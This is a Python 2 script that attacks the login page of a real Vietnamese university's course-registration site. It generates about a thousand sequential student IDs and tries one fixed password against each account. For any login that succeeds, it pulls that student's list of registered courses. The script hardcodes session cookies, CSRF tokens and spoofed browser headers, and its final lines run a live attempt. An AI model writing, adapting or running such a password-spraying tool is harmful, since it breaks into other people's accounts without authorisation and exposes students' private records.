import requests

host = 'http://dangkyhoc.daotao.vnu.edu.vn/dang-nhap'


#studentID = ''
#passw = ''

def check(studentID, passw):
	payload = {'LoginName': studentID, 'Password': passw, '__RequestVerificationToken': 'e4dBmzKQN245hMpLnjwX19efdikITAR39gf7dl1WjKk-PVrQ1WxdcQxjYJTf8N8JsecCb5QnIsr4VGSKQr8N51vUlkk1'}
	header = {
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"Origin": "http://dangkyhoc.daotao.vnu.edu.vn",
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36",
		"Content-Type": "application/x-www-form-urlencoded",
		"Connection": "keep-alive",
		"Referer": "http://dangkyhoc.daotao.vnu.edu.vn/dang-nhap",
		"Accept-Encoding": "gzip, deflate",
		"Accept-Language": "en-US,en;q=0.8,vi;q=0.6",
		"Cookie": "__RequestVerificationToken=aQZqLH-tupV1-iC1hOsNQrdkhvJsZAtvMkQshyxJCp8N6VioayiIGVRCwRo3A18R5GjxkCZ8KuX3q6WVht0-3OV4UVA1; _ga=GA1.3.1472198888.1418201376; _gat=1"
	}
	r = requests.post(host, data=payload, headers = header)
	
	#r2 = requests.get('http://dangkyhoc.daotao.vnu.edu.vn/dang-ky-mon-hoc-nganh-1', headers=r.headers, cookies=r.cookies)
	#print r2.text.encode('utf8')
	return r.text.encode('utf8').find('#LoginName') == -1
#print requests.get(host).text.encode('utf8')

def dsmh():
	header = {
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"Origin": "http://dangkyhoc.daotao.vnu.edu.vn",
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36",
		"Content-Type": "application/x-www-form-urlencoded",
		"Referer": "http://dangkyhoc.daotao.vnu.edu.vn/dang-ky-mon-hoc-nganh-1",
		"Accept-Encoding": "gzip, deflate",
		"Connection": "keep-alive",
		"Accept-Language": "en-US,en;q=0.8,vi;q=0.6",
		"Cookie": "__RequestVerificationToken=aQZqLH-tupV1-iC1hOsNQrdkhvJsZAtvMkQshyxJCp8N6VioayiIGVRCwRo3A18R5GjxkCZ8KuX3q6WVht0-3OV4UVA1; _ga=GA1.3.1472198888.1418201376; _gat=1; ASP.NET_SessionId=3qgk4zr4wq0r3jgzyd0vukks"
	}
	r = requests.post('http://dangkyhoc.daotao.vnu.edu.vn/danh-sach-mon-hoc/1/1', headers=header)
	print r.text.encode('utf8')

def dsmhdk():
	header = {
		"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"Origin": "http://dangkyhoc.daotao.vnu.edu.vn",
		"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36",
		"Content-Type": "application/x-www-form-urlencoded",
		"Referer": "http://dangkyhoc.daotao.vnu.edu.vn/dang-ky-mon-hoc-nganh-1",
		"Accept-Encoding": "gzip, deflate",
		"Connection": "keep-alive",
		"Accept-Language": "en-US,en;q=0.8,vi;q=0.6",		
		"Cookie": "__RequestVerificationToken=aQZqLH-tupV1-iC1hOsNQrdkhvJsZAtvMkQshyxJCp8N6VioayiIGVRCwRo3A18R5GjxkCZ8KuX3q6WVht0-3OV4UVA1; _ga=GA1.3.1472198888.1418201376; _gat=1; ASP.NET_SessionId=3qgk4zr4wq0r3jgzyd0vukks"
	}
	r = requests.post('http://dangkyhoc.daotao.vnu.edu.vn/danh-sach-mon-hoc-da-dang-ky/1', headers=header)
	print r.text.encode('utf8')
	return r.text.encode('utf8').find('INT') != -1

def guess():
	for i in range(999):
		id = str(i)
		while len(id) < 3:
			id = '0' + id
		studentID = '12020' + id
		if check(studentID, "0u5a1n1x"):
			print "[?] Checking %s" %(studentID)
			if dsmhdk():
				print 'Yes'

#check('12020610', '12020610')
#dsmh()	
# dsmhdk()
#
if check("12020110", "0u5a1n1x"):
	print "[?] Checking"
	if dsmhdk():
		print 'Yes'